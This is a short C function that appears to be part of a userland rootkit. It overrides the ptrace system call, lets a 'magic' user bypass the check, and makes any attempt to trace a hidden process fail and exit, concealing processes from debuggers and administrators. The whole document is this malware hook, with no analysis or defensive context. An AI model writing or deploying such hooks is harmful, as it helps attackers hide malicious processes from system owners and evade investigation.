long ptrace(void *request, pid_t pid, void *addr, void *data){
    if(magicusr()) goto o_ptrace;

    if(hidden_proc(pid)){
        errno = ESRCH;
        exit(-1);
    }
o_ptrace:
    hook(CPTRACE);
    return (long)call(CPTRACE, request, pid, addr, data);
}
